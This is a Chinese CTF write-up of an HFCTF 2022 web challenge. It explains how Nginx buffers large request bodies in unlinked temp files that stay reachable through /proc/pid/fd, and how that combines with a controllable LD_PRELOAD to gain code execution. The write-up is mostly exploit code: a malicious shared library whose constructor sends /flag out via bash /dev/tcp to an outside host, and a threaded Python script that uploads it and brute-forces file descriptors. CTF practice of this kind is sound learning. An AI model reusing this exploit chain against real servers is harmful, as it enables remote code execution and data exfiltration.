[博客园wp](https://www.cnblogs.com/h0cksr/p/16189739.html) & [先知社区wp](https://xz.aliyun.com/t/11073)

仅仅能控制环境变量，参考p神的文章，本题是在可控环境变量的条件下执行sh -c "echo hfctf2022"，但是本题和p神的环境不一样。

### Nginx临时文件
~~Nginx用于反向代理时，从后端web应用接受响应并缓存到本地，然后发往客户端。响应较小时缓存到内存，如果响应过大则或发往客户端速度太慢导致内存缓冲区满，则会将一部分缓冲区内容写入临时文件中，腾出缓冲区部分空间。[source code分析](https://blog.csdn.net/kai_ding/article/details/21297101)~~(查错了，不是这个知识点)

Nginx会读取客户端请求正文(body)，有一个的缓冲区用于存储正文。如果请求正文大于缓冲区，则整个正文或仅其部分将写入临时文件，默认情况下缓冲区大小等于两个内存页。

贴一处抄来的Nginx代码：
```
ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);
    }

    return fd;
}
```

划重点，刚上过os课现在os的知识就来了。unlink是让文件硬链接数-1，减到0并且没有被进程open则会删除文件。如果open之后close之前执行unlink让硬链接数减到了0，那么文件不会被立刻删除，通过fd依旧可以正常操作，在close之后才会被删除。

那么此时文件在哪里呢？测试一下。安装VMware Player和Ubuntu镜像，然后gcc编译以下代码：
```
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <unistd.h>

int main() {
    puts("[+] test for open/unlink/write [+]\n");
    int fd = open("test.txt", O_CREAT|O_EXCL|O_RDWR, 0600);
    printf("open file with fd %d,try unlink\n",fd);

    unlink("test.txt");
    printf("unlink file, try write content\n");
    if(write(fd, "<?php phpinfo();?>", 19) != 19)
    {
        printf("write file error!\n");
    }

    char buffer[0x10] = {0};
    lseek(fd, 0,SEEK_SET);
    int size = read(fd, buffer , 19);
    printf("read size is %d\n",size);
    printf("read buffer is %s\n",buffer);

    puts("stopped here, input any char to execute close(): ");
    getchar();
    close(fd);
    return 0;
}
```
当目录下没有test.txt时，测试结果如图，甚至可以直接cat 3读出内容：
![nil](https://github.com/local-h0st/CTF/blob/30ede03357edb15579ffb06cb3adb9d341bf3576/writeups/pics/test_unlink_01.png)
直接访问路径行吗？


如果预先存在test.txt则不会存在/proc/pid/fd/3这个软链接，且a.out本身输出buff为空，如图：
![nil](https://github.com/local-h0st/CTF/blob/main/writeups/pics/test_unlink_02.png)
此时在getchar挡住，close未执行的情况下，目录下我自己创建的test.txt就已经消失不见了。

### LD_PRELOAD
LD_PRELOAD在进程启动前设置。\_\_attribute__是一个编译属性，GNU C特色之一，其中__attribute__((constructor))确保此函数在main函数之前被调用。贴个exp：
```
// hacklib.c
#include <stdlib.h>
#include <string.h>
__attribute__ ((constructor)) void call ()
{
    unsetenv("LD_PRELOAD");
    char str[65536];
    system("bash -c 'cat /flag' > /dev/tcp/ip/port");
    system("cat /flag > /var/www/html/flag");
}
```
gcc hacklib.c -shared -fPIC -o hacklib.so -ldl，-ldl不加也行，最终编译得到hacklib.so文件。

当我们访问php，传入参数为LD_PRELOAD=/proc/pid/fd/后，当前php脚本先会setenv，然后去执行system函数。从p神的文章中我们可以看到，system函数最终是去执行sh -c "xxx"，也就是启动一个sh进程去执行命令，获得其返回结果。由于sh是由当前php脚本开的，因此LD_PRELOAD的环境变量能被sh继承下来。所以在开sh前，hacklib.so内的call()函数就会被先执行。

### 贴一份完整的Python脚本
```
import threading, requests, time

URL = f'http://94398b21-7016-4eb8-a479-93a5b97e536f.node4.buuoj.cn:81/'
large_body = open("hacklib.so", "rb").read() + (16 * 1024 * 'A').encode()

done = False
flag = ""


# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data=large_body)


# 16 threads keep on sending large body.
for _ in range(1):
    threading.Thread(target=uploader).start()


def try_get_flag():
    global done, flag
    r = requests.get(URL + "flag")
    print("trying to get flag")
    if r.status_code == 200:
        if "{" in r.text:
            done = True
            flag = r.text
            print("flag:", flag)
            return
    print("get flag failed")


def bruter(pid):
    print(f'[+] brute loop restarted: {pid} \n')
    for fd in range(4, 100):
        f = f'/proc/{pid}/fd/{fd}'
        # print(f)
        try:
            r = requests.get(URL, params={
                'env': 'LD_PRELOAD=' + f,
            })
        except Exception:
            pass
    try_get_flag()


def bruser_group(start_pid, count):
    while not done:
        current_pid = start_pid
        while count > 0:
            bruter(current_pid)
            count -= 1
            current_pid += 1


# if test locally, can use pid; else need to brute.
# nginx_workers = [ 266, 268, 32831, 33666, 9]
for i in range(2, 20):
    threading.Thread(target=bruser_group, args=(i * 50, 50)).start()
```
还是反弹shell出来的，，一顿操作虚拟机Ubuntu图形界面给我搞没了，，

不过最终还是没扫出来，buu的环境动不动就G

anyway学到了很多
